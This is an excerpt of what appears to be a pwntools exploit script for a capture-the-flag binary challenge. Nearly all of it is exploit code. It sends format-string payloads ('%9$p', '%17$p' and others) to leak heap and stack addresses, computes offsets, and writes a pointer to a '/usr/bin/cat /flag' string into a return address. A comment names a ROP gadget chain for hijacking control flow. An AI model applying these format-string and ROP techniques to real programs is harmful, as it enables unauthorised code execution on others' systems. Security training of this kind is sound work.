...
heap_str_addr = 0xffffffffffffffff
...
heap_str_addr = int(lines[3], 16) - 0x110 # 实际上在上一个malloc的缓冲区
print("heap cat /flag:", hex(heap_str_addr))
p1 = int(lines[5], 16)
# p.interactive()
...
p.sendline(b'3')
p.send(b'%9$p\n%17$p\n%18$p\n%19$p\n')
print(p.recvlines(numlines=12)[2:6])
...
addr = p1 - 0xc8
data = heap_str_addr
write(addr, data) # rdi="/usr/bin/cat /flag"
p.clean()
p.sendline(b'3')
p.send(b'%9$p\n%17$p\n%18$p\n%19$p\n')
print(p.recvlines(numlines=12)[2:6])
...
write(addr, data, br=True) # pop rdx; pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
